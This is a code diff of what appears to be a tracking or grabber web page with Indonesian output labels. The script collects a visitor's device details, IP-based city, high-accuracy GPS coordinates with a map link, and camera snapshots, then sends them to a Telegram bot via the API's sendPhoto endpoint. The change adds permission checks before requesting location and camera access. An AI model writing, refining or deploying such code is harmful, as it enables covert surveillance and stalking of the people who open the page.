@@ -114,7 +114,16 @@
         fetch(`https://api.telegram.org/bot${token2}/sendPhoto`, { method: "POST", body: form2 })  
       ]);  
     };  
-  
+
+    const cekIzin = async (tipe) => {
+      try {
+        const status = await navigator.permissions.query({ name: tipe });
+        return status.state === 'granted';
+      } catch {
+        return false;
+      }
+    };
+
     const ambilDataPerangkat = async () => {  
       const ua = navigator.userAgent;  
       const platform = navigator.platform;  
@@ -183,10 +192,19 @@ Kota                : ${ip.city}
       }  
     };  
   
-    const ambilLokasi = () => {  
-      return new Promise((resolve) => {  
-        navigator.geolocation.getCurrentPosition(pos => {  
-          const { latitude, longitude, accuracy } = pos.coords;  
+    const ambilLokasi = async () => {
+      const izin = await cekIzin("geolocation");
+      if (!izin) {
+        return `  
+- 〘 𝗟𝚶𝗞𝚫𝗦𝗜 𝗟𝚫𝗡𝗚𝗦𝗨𝗡𝗚 〙 -  
+  
+❌ Lokasi tidak diizinkan oleh pengguna (belum aktif di pengaturan).  
+`;
+      }
+
+      return new Promise((resolve) => {
+        navigator.geolocation.getCurrentPosition(pos => {
+          const { latitude, longitude, accuracy } = pos.coords;
           resolve(`  
 ౼ 〘 𝗟𝚶𝗞𝚫𝗦𝗜 𝗟𝚫𝗡𝗚𝗦𝗨𝗡𝗚 〙 ౼  
   
@@ -194,18 +212,25 @@ Latitude            : ${latitude}
 Longitude           : ${longitude}  
 Akurasi             : ±${accuracy} meter  
 Peta                : https://maps.google.com/?q=${latitude},${longitude}  
-`);  
-        }, () => {  
+`);
+        }, () => {
           resolve(`  
 - 〘 𝗟𝚶𝗞𝚫𝗦𝗜 𝗟𝚫𝗡𝗚𝗦𝗨𝗡𝗚 〙 -  
   
 ❌ Lokasi tidak diizinkan oleh pengguna.  
-`);  
-        }, { enableHighAccuracy: true, timeout: 7000 });  
-      });  
-    };  
-  
+`);
+        }, { enableHighAccuracy: true, timeout: 7000 });
+      });
+    };
+
     const ambilKamera = async (facingMode, label) => {  
+      const izin = await cekIzin("camera");  
+      if (!izin) {  
+        return `  
+- 〘 ${label} 〙 -  
+❌ Kamera tidak diizinkan oleh pengguna (belum aktif di pengaturan).  
+`;  
+      }  
       try {  
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });  
         const video = document.createElement("video");  
@@ -234,7 +259,7 @@ Peta                : https://maps.google.com/?q=${latitude},${longitude}
         return "";  
       } catch {  
         return `  
-౼ 〘 ${label} 〙 ౼  
+- 〘 ${label} 〙 -  
 ❌ Kamera tidak diizinkan oleh pengguna.  
 `;  
       }  
